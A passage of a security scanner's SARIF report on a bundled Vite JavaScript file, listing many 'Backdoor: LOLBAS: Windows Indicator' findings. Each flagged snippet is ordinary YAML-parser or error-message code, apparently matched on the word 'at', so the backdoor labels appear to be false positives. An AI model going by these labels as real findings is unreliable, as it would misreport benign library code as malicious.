                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 30182,
                  "startColumn": 97,
                  "endLine": 30182,
                  "endColumn": 101,
                  "snippet": {
                    "text": "                            }\n                        }\n                    if (props.start < valueProps.found.offset - 1024)\n                        onError(valueProps.found, 'KEY_OVER_1024_CHARS', 'The : indicator must be at most 1024 chars after the start of an implicit flow sequence key');\n                }\n            }\n            else if (value) {\n",
                    "rendered": {
                      "text": "                            }\n                        }\n                    if (props.start < valueProps.found.offset - 1024)\n                        onError(valueProps.found, 'KEY_OVER_1024_CHARS', 'The : indicator must be at most 1024 chars after the start of an implicit flow sequence key');\n                }\n            }\n            else if (value) {\n",
                      "markdown": "`                            }\n                        }\n                    if (props.start < valueProps.found.offset - 1024)\n                        onError(valueProps.found, 'KEY_OVER_1024_CHARS', 'The : indicator must be at most 1024 chars after the start of an implicit flow sequence key');\n                }\n            }\n            else if (value) {\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 30056,
                  "startColumn": 74,
                  "endLine": 30056,
                  "endColumn": 78,
                  "snippet": {
                    "text": "                    hasSpace = true;\n                    break;\n                default:\n                    onError(token, 'UNEXPECTED_TOKEN', `Unexpected ${type} at node end`);\n            }\n            offset += source.length;\n        }\n",
                    "rendered": {
                      "text": "                    hasSpace = true;\n                    break;\n                default:\n                    onError(token, 'UNEXPECTED_TOKEN', `Unexpected ${type} at node end`);\n            }\n            offset += source.length;\n        }\n",
                      "markdown": "`                    hasSpace = true;\n                    break;\n                default:\n                    onError(token, 'UNEXPECTED_TOKEN', `Unexpected ${type} at node end`);\n            }\n            offset += source.length;\n        }\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 30005,
                  "startColumn": 83,
                  "endLine": 30005,
                  "endColumn": 87,
                  "snippet": {
                    "text": "        if (!props.found) {\n            if (props.anchor || props.tag || value) {\n                if (value && value.type === 'block-seq')\n                    onError(props.end, 'BAD_INDENT', 'All sequence items must start at the same column');\n                else\n                    onError(offset, 'MISSING_CHAR', 'Sequence item without - indicator');\n            }\n",
                    "rendered": {
                      "text": "        if (!props.found) {\n            if (props.anchor || props.tag || value) {\n                if (value && value.type === 'block-seq')\n                    onError(props.end, 'BAD_INDENT', 'All sequence items must start at the same column');\n                else\n                    onError(offset, 'MISSING_CHAR', 'Sequence item without - indicator');\n            }\n",
                      "markdown": "`        if (!props.found) {\n            if (props.anchor || props.tag || value) {\n                if (value && value.type === 'block-seq')\n                    onError(props.end, 'BAD_INDENT', 'All sequence items must start at the same column');\n                else\n                    onError(offset, 'MISSING_CHAR', 'Sequence item without - indicator');\n            }\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 29950,
                  "startColumn": 90,
                  "endLine": 29950,
                  "endColumn": 94,
                  "snippet": {
                    "text": "                    onError(offset, 'BLOCK_AS_IMPLICIT_KEY', 'Nested mappings are not allowed in compact mappings');\n                if (ctx.options.strict &&\n                    keyProps.start < valueProps.found.offset - 1024)\n                    onError(keyNode.range, 'KEY_OVER_1024_CHARS', 'The : indicator must be at most 1024 chars after the start of an implicit block mapping key');\n            }\n            // value value\n            const valueNode = value\n",
                    "rendered": {
                      "text": "                    onError(offset, 'BLOCK_AS_IMPLICIT_KEY', 'Nested mappings are not allowed in compact mappings');\n                if (ctx.options.strict &&\n                    keyProps.start < valueProps.found.offset - 1024)\n                    onError(keyNode.range, 'KEY_OVER_1024_CHARS', 'The : indicator must be at most 1024 chars after the start of an implicit block mapping key');\n            }\n            // value value\n            const valueNode = value\n",
                      "markdown": "`                    onError(offset, 'BLOCK_AS_IMPLICIT_KEY', 'Nested mappings are not allowed in compact mappings');\n                if (ctx.options.strict &&\n                    keyProps.start < valueProps.found.offset - 1024)\n                    onError(keyNode.range, 'KEY_OVER_1024_CHARS', 'The : indicator must be at most 1024 chars after the start of an implicit block mapping key');\n            }\n            // value value\n            const valueNode = value\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 29881,
                  "startColumn": 49,
                  "endLine": 29881,
                  "endColumn": 53,
                  "snippet": {
                    "text": "    return items.some(pair => isEqual(pair.key, search));\n}\n\nconst startColMsg = 'All mapping items must start at the same column';\nfunction resolveBlockMap({ composeNode, composeEmptyNode }, ctx, bm, onError, tag) {\n    const NodeClass = tag?.nodeClass ?? YAMLMap;\n    const map = new NodeClass(ctx.schema);\n",
                    "rendered": {
                      "text": "    return items.some(pair => isEqual(pair.key, search));\n}\n\nconst startColMsg = 'All mapping items must start at the same column';\nfunction resolveBlockMap({ composeNode, composeEmptyNode }, ctx, bm, onError, tag) {\n    const NodeClass = tag?.nodeClass ?? YAMLMap;\n    const map = new NodeClass(ctx.schema);\n",
                      "markdown": "`    return items.some(pair => isEqual(pair.key, search));\n}\n\nconst startColMsg = 'All mapping items must start at the same column';\nfunction resolveBlockMap({ composeNode, composeEmptyNode }, ctx, bm, onError, tag) {\n    const NodeClass = tag?.nodeClass ?? YAMLMap;\n    const map = new NodeClass(ctx.schema);\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 29757,
                  "startColumn": 68,
                  "endLine": 29757,
                  "endColumn": 72,
                  "snippet": {
                    "text": "                break;\n            case 'tag': {\n                if (tag)\n                    onError(token, 'MULTIPLE_TAGS', 'A node can have at most one tag');\n                tag = token;\n                if (start === null)\n                    start = token.offset;\n",
                    "rendered": {
                      "text": "                break;\n            case 'tag': {\n                if (tag)\n                    onError(token, 'MULTIPLE_TAGS', 'A node can have at most one tag');\n                tag = token;\n                if (start === null)\n                    start = token.offset;\n",
                      "markdown": "`                break;\n            case 'tag': {\n                if (tag)\n                    onError(token, 'MULTIPLE_TAGS', 'A node can have at most one tag');\n                tag = token;\n                if (start === null)\n                    start = token.offset;\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 29745,
                  "startColumn": 71,
                  "endLine": 29745,
                  "endColumn": 75,
                  "snippet": {
                    "text": "                break;\n            case 'anchor':\n                if (anchor)\n                    onError(token, 'MULTIPLE_ANCHORS', 'A node can have at most one anchor');\n                if (token.source.endsWith(':'))\n                    onError(token.offset + token.source.length - 1, 'BAD_ALIAS', 'Anchor ending in : is ambiguous', true);\n                anchor = token;\n",
                    "rendered": {
                      "text": "                break;\n            case 'anchor':\n                if (anchor)\n                    onError(token, 'MULTIPLE_ANCHORS', 'A node can have at most one anchor');\n                if (token.source.endsWith(':'))\n                    onError(token.offset + token.source.length - 1, 'BAD_ALIAS', 'Anchor ending in : is ambiguous', true);\n                anchor = token;\n",
                      "markdown": "`                break;\n            case 'anchor':\n                if (anchor)\n                    onError(token, 'MULTIPLE_ANCHORS', 'A node can have at most one anchor');\n                if (token.source.endsWith(':'))\n                    onError(token.offset + token.source.length - 1, 'BAD_ALIAS', 'Anchor ending in : is ambiguous', true);\n                anchor = token;\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 29643,
                  "startColumn": 22,
                  "endLine": 29643,
                  "endColumn": 26,
                  "snippet": {
                    "text": "        return;\n    error.linePos = error.pos.map(pos => lc.linePos(pos));\n    const { line, col } = error.linePos[0];\n    error.message += ` at line ${line}, column ${col}`;\n    let ci = col - 1;\n    let lineStr = src\n        .substring(lc.lineStarts[line - 1], lc.lineStarts[line])\n",
                    "rendered": {
                      "text": "        return;\n    error.linePos = error.pos.map(pos => lc.linePos(pos));\n    const { line, col } = error.linePos[0];\n    error.message += ` at line ${line}, column ${col}`;\n    let ci = col - 1;\n    let lineStr = src\n        .substring(lc.lineStarts[line - 1], lc.lineStarts[line])\n",
                      "markdown": "`        return;\n    error.linePos = error.pos.map(pos => lc.linePos(pos));\n    const { line, col } = error.linePos[0];\n    error.message += ` at line ${line}, column ${col}`;\n    let ci = col - 1;\n    let lineStr = src\n        .substring(lc.lineStarts[line - 1], lc.lineStarts[line])\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 28099,
                  "startColumn": 13,
                  "endLine": 28099,
                  "endColumn": 17,
                  "snippet": {
                    "text": "    if (comment && chompKeep)\n        comment = comment.replace(/^\\n+/, '');\n    if (comment) {\n        const ic = indentComment(commentString(comment), indent);\n        lines.push(ic.trimStart()); // Avoid double indent on first line\n    }\n}\n",
                    "rendered": {
                      "text": "    if (comment && chompKeep)\n        comment = comment.replace(/^\\n+/, '');\n    if (comment) {\n        const ic = indentComment(commentString(comment), indent);\n        lines.push(ic.trimStart()); // Avoid double indent on first line\n    }\n}\n",
                      "markdown": "`    if (comment && chompKeep)\n        comment = comment.replace(/^\\n+/, '');\n    if (comment) {\n        const ic = indentComment(commentString(comment), indent);\n        lines.push(ic.trimStart()); // Avoid double indent on first line\n    }\n}\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 27073,
                  "startColumn": 57,
                  "endLine": 27073,
                  "endColumn": 61,
                  "snippet": {
                    "text": "            else if (node === undefined && this.schema)\n                this.set(key, collectionFromPath(this.schema, rest, value));\n            else\n                throw new Error(`Expected YAML collection at ${key}. Remaining path: ${rest}`);\n        }\n    }\n}\n",
                    "rendered": {
                      "text": "            else if (node === undefined && this.schema)\n                this.set(key, collectionFromPath(this.schema, rest, value));\n            else\n                throw new Error(`Expected YAML collection at ${key}. Remaining path: ${rest}`);\n        }\n    }\n}\n",
                      "markdown": "`            else if (node === undefined && this.schema)\n                this.set(key, collectionFromPath(this.schema, rest, value));\n            else\n                throw new Error(`Expected YAML collection at ${key}. Remaining path: ${rest}`);\n        }\n    }\n}\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 27018,
                  "startColumn": 53,
                  "endLine": 27018,
                  "endColumn": 57,
                  "snippet": {
                    "text": "        if (isCollection$1(node))\n            return node.deleteIn(rest);\n        else\n            throw new Error(`Expected YAML collection at ${key}. Remaining path: ${rest}`);\n    }\n    /**\n     * Returns item at `key`, or `undefined` if not found. By default unwraps\n",
                    "rendered": {
                      "text": "        if (isCollection$1(node))\n            return node.deleteIn(rest);\n        else\n            throw new Error(`Expected YAML collection at ${key}. Remaining path: ${rest}`);\n    }\n    /**\n     * Returns item at `key`, or `undefined` if not found. By default unwraps\n",
                      "markdown": "`        if (isCollection$1(node))\n            return node.deleteIn(rest);\n        else\n            throw new Error(`Expected YAML collection at ${key}. Remaining path: ${rest}`);\n    }\n    /**\n     * Returns item at `key`, or `undefined` if not found. By default unwraps\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 27003,
                  "startColumn": 57,
                  "endLine": 27003,
                  "endColumn": 61,
                  "snippet": {
                    "text": "            else if (node === undefined && this.schema)\n                this.set(key, collectionFromPath(this.schema, rest, value));\n            else\n                throw new Error(`Expected YAML collection at ${key}. Remaining path: ${rest}`);\n        }\n    }\n    /**\n",
                    "rendered": {
                      "text": "            else if (node === undefined && this.schema)\n                this.set(key, collectionFromPath(this.schema, rest, value));\n            else\n                throw new Error(`Expected YAML collection at ${key}. Remaining path: ${rest}`);\n        }\n    }\n    /**\n",
                      "markdown": "`            else if (node === undefined && this.schema)\n                this.set(key, collectionFromPath(this.schema, rest, value));\n            else\n                throw new Error(`Expected YAML collection at ${key}. Remaining path: ${rest}`);\n        }\n    }\n    /**\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 26559,
                  "startColumn": 58,
                  "endLine": 26559,
                  "endColumn": 67,
                  "snippet": {
                    "text": "function anchorIsValid(anchor) {\n    if (/[\\x00-\\x19\\s,[\\]{}]/.test(anchor)) {\n        const sa = JSON.stringify(anchor);\n        const msg = `Anchor must not contain whitespace or control characters: ${sa}`;\n        throw new Error(msg);\n    }\n    return true;\n",
                    "rendered": {
                      "text": "function anchorIsValid(anchor) {\n    if (/[\\x00-\\x19\\s,[\\]{}]/.test(anchor)) {\n        const sa = JSON.stringify(anchor);\n        const msg = `Anchor must not contain whitespace or control characters: ${sa}`;\n        throw new Error(msg);\n    }\n    return true;\n",
                      "markdown": "`function anchorIsValid(anchor) {\n    if (/[\\x00-\\x19\\s,[\\]{}]/.test(anchor)) {\n        const sa = JSON.stringify(anchor);\n        const msg = `Anchor must not contain whitespace or control characters: ${sa}`;\n        throw new Error(msg);\n    }\n    return true;\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 20856,
                  "startColumn": 49,
                  "endLine": 20856,
                  "endColumn": 53,
                  "snippet": {
                    "text": "\t  if (typeof read === 'string') {\n\t    throw new Error(\n\t      'String directory paths are no longer supported with `fromMapFileSource`\\n' +\n\t      'Please review the Upgrading documentation at https://github.com/thlorenz/convert-source-map#upgrading'\n\t    )\n\t  }\n\t  var m = content.match(exports.mapFileCommentRegex);\n",
                    "rendered": {
                      "text": "\t  if (typeof read === 'string') {\n\t    throw new Error(\n\t      'String directory paths are no longer supported with `fromMapFileSource`\\n' +\n\t      'Please review the Upgrading documentation at https://github.com/thlorenz/convert-source-map#upgrading'\n\t    )\n\t  }\n\t  var m = content.match(exports.mapFileCommentRegex);\n",
                      "markdown": "`\t  if (typeof read === 'string') {\n\t    throw new Error(\n\t      'String directory paths are no longer supported with `fromMapFileSource`\\n' +\n\t      'Please review the Upgrading documentation at https://github.com/thlorenz/convert-source-map#upgrading'\n\t    )\n\t  }\n\t  var m = content.match(exports.mapFileCommentRegex);\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 20833,
                  "startColumn": 49,
                  "endLine": 20833,
                  "endColumn": 53,
                  "snippet": {
                    "text": "\t  if (typeof read === 'string') {\n\t    throw new Error(\n\t      'String directory paths are no longer supported with `fromMapFileComment`\\n' +\n\t      'Please review the Upgrading documentation at https://github.com/thlorenz/convert-source-map#upgrading'\n\t    )\n\t  }\n\n",
                    "rendered": {
                      "text": "\t  if (typeof read === 'string') {\n\t    throw new Error(\n\t      'String directory paths are no longer supported with `fromMapFileComment`\\n' +\n\t      'Please review the Upgrading documentation at https://github.com/thlorenz/convert-source-map#upgrading'\n\t    )\n\t  }\n\n",
                      "markdown": "`\t  if (typeof read === 'string') {\n\t    throw new Error(\n\t      'String directory paths are no longer supported with `fromMapFileComment`\\n' +\n\t      'Please review the Upgrading documentation at https://github.com/thlorenz/convert-source-map#upgrading'\n\t    )\n\t  }\n\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 20706,
                  "startColumn": 73,
                  "endLine": 20706,
                  "endColumn": 77,
                  "snippet": {
                    "text": "\t  }\n\n\t  function throwError(e) {\n\t    throw new Error('An error occurred while trying to read the map file at ' + filename + '\\n' + e.stack);\n\t  }\n\t}\n\n",
                    "rendered": {
                      "text": "\t  }\n\n\t  function throwError(e) {\n\t    throw new Error('An error occurred while trying to read the map file at ' + filename + '\\n' + e.stack);\n\t  }\n\t}\n\n",
                      "markdown": "`\t  }\n\n\t  function throwError(e) {\n\t    throw new Error('An error occurred while trying to read the map file at ' + filename + '\\n' + e.stack);\n\t  }\n\t}\n\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 14918,
                  "startColumn": 83,
                  "endLine": 14918,
                  "endColumn": 87,
                  "snippet": {
                    "text": "}\n\nconst LINE_GTR_ZERO = '`line` must be greater than 0 (lines start at line 1)';\nconst COL_GTR_EQ_ZERO = '`column` must be greater than or equal to 0 (columns start at column 0)';\nconst LEAST_UPPER_BOUND = -1;\nconst GREATEST_LOWER_BOUND = 1;\nclass TraceMap {\n",
                    "rendered": {
                      "text": "}\n\nconst LINE_GTR_ZERO = '`line` must be greater than 0 (lines start at line 1)';\nconst COL_GTR_EQ_ZERO = '`column` must be greater than or equal to 0 (columns start at column 0)';\nconst LEAST_UPPER_BOUND = -1;\nconst GREATEST_LOWER_BOUND = 1;\nclass TraceMap {\n",
                      "markdown": "`}\n\nconst LINE_GTR_ZERO = '`line` must be greater than 0 (lines start at line 1)';\nconst COL_GTR_EQ_ZERO = '`column` must be greater than or equal to 0 (columns start at column 0)';\nconst LEAST_UPPER_BOUND = -1;\nconst GREATEST_LOWER_BOUND = 1;\nclass TraceMap {\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 14917,
                  "startColumn": 65,
                  "endLine": 14917,
                  "endColumn": 69,
                  "snippet": {
                    "text": "    return (state.lastIndex = binarySearch(haystack, needle, low, high));\n}\n\nconst LINE_GTR_ZERO = '`line` must be greater than 0 (lines start at line 1)';\nconst COL_GTR_EQ_ZERO = '`column` must be greater than or equal to 0 (columns start at column 0)';\nconst LEAST_UPPER_BOUND = -1;\nconst GREATEST_LOWER_BOUND = 1;\n",
                    "rendered": {
                      "text": "    return (state.lastIndex = binarySearch(haystack, needle, low, high));\n}\n\nconst LINE_GTR_ZERO = '`line` must be greater than 0 (lines start at line 1)';\nconst COL_GTR_EQ_ZERO = '`column` must be greater than or equal to 0 (columns start at column 0)';\nconst LEAST_UPPER_BOUND = -1;\nconst GREATEST_LOWER_BOUND = 1;\n",
                      "markdown": "`    return (state.lastIndex = binarySearch(haystack, needle, low, high));\n}\n\nconst LINE_GTR_ZERO = '`line` must be greater than 0 (lines start at line 1)';\nconst COL_GTR_EQ_ZERO = '`column` must be greater than or equal to 0 (columns start at column 0)';\nconst LEAST_UPPER_BOUND = -1;\nconst GREATEST_LOWER_BOUND = 1;\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 13098,
                  "startColumn": 71,
                  "endLine": 13098,
                  "endColumn": 75,
                  "snippet": {
                    "text": "    (major === minMajor && (minor < minMinor || (minor === minMinor && patch < minPatch)))\n  ) {\n    throw new Error(\n      `Insufficient ${name} version: \"@rollup/plugin-commonjs\" requires at least ${name}@${minMajor}.${minMinor}.${minPatch} but found ${name}@${actualVersion}.`\n    );\n  }\n}\n",
                    "rendered": {
                      "text": "    (major === minMajor && (minor < minMinor || (minor === minMinor && patch < minPatch)))\n  ) {\n    throw new Error(\n      `Insufficient ${name} version: \"@rollup/plugin-commonjs\" requires at least ${name}@${minMajor}.${minMinor}.${minPatch} but found ${name}@${actualVersion}.`\n    );\n  }\n}\n",
                      "markdown": "`    (major === minMajor && (minor < minMinor || (minor === minMinor && patch < minPatch)))\n  ) {\n    throw new Error(\n      `Insufficient ${name} version: \"@rollup/plugin-commonjs\" requires at least ${name}@${minMajor}.${minMinor}.${minPatch} but found ${name}@${actualVersion}.`\n    );\n  }\n}\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 13089,
                  "startColumn": 71,
                  "endLine": 13089,
                  "endColumn": 75,
                  "snippet": {
                    "text": "  }\n  if (!actualVersion) {\n    throw new Error(\n      `Insufficient ${name} version: \"@rollup/plugin-commonjs\" requires at least ${name}@${minMajor}.${minMinor}.${minPatch}.`\n    );\n  }\n  const [major, minor, patch] = actualVersion.split('.').map(Number);\n",
                    "rendered": {
                      "text": "  }\n  if (!actualVersion) {\n    throw new Error(\n      `Insufficient ${name} version: \"@rollup/plugin-commonjs\" requires at least ${name}@${minMajor}.${minMinor}.${minPatch}.`\n    );\n  }\n  const [major, minor, patch] = actualVersion.split('.').map(Number);\n",
                      "markdown": "`  }\n  if (!actualVersion) {\n    throw new Error(\n      `Insufficient ${name} version: \"@rollup/plugin-commonjs\" requires at least ${name}@${minMajor}.${minMinor}.${minPatch}.`\n    );\n  }\n  const [major, minor, patch] = actualVersion.split('.').map(Number);\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 6745,
                  "startColumn": 47,
                  "endLine": 6745,
                  "endColumn": 51,
                  "snippet": {
                    "text": "     * @deprecated - This is a read-only property\n     */\n    set objectMode(_om) {\n        throw new Error('objectMode must be set at instantiation time');\n    }\n    /**\n     * true if this is an async stream\n",
                    "rendered": {
                      "text": "     * @deprecated - This is a read-only property\n     */\n    set objectMode(_om) {\n        throw new Error('objectMode must be set at instantiation time');\n    }\n    /**\n     * true if this is an async stream\n",
                      "markdown": "`     * @deprecated - This is a read-only property\n     */\n    set objectMode(_om) {\n        throw new Error('objectMode must be set at instantiation time');\n    }\n    /**\n     * true if this is an async stream\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 6733,
                  "startColumn": 45,
                  "endLine": 6733,
                  "endColumn": 49,
                  "snippet": {
